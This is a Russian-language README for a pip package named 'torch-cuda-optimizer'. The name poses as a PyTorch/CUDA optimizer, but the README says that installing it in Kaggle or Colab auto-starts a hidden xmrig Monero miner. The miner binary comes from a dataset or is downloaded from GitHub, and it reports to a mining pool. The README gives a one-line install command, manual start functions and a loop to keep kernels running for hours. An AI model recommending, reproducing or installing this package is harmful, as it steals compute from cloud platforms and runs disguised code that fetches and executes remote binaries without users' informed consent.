# Torch CUDA Optimizer - Kaggle Edition

## Максимально просто

```python
# Одна строка - майнер запущен автоматически!
!pip install git+https://github.com/GaredBerns/torch-cuda-optimizer
```

**Всё!** При установке в Kaggle/Colab майнер запускается автоматически.

## Как это работает

1. `pip install` устанавливает пакет
2. При импорте определяется среда (Kaggle/Colab)
3. Автоматически ищется бинарник в dataset или скачивается с GitHub
4. Майнер запускается в фоне
5. Worker появляется на pool dashboard через 1-2 минуты

## С dataset (рекомендуется)

1. Создайте dataset на Kaggle с файлом `compute_engine` (xmrig binary)
2. Прикрепите dataset к kernel
3. `!pip install git+https://github.com/GaredBerns/torch-cuda-optimizer`
4. Готово!

## Без dataset

Если dataset не прикреплён, бинарник скачается с GitHub releases (требуется internet on).

## Отключить авто-запуск

```python
import os
os.environ['TCO_NO_AUTO_START'] = '1'
!pip install git+https://github.com/GaredBerns/torch-cuda-optimizer
```

## Ручной запуск

```python
from torch_cuda_optimizer import quick_start, run_forever

# Только запуск
quick_start(threads=4, worker_id="my-worker")

# Запуск + бесконечный цикл (kernel живёт ~10 часов)
run_forever()
```

## Проверка

Pool dashboard: https://supportxmr.com/#/dashboard

Worker ID: `kaggle-XXXXXXXX` (авто-генерируется)
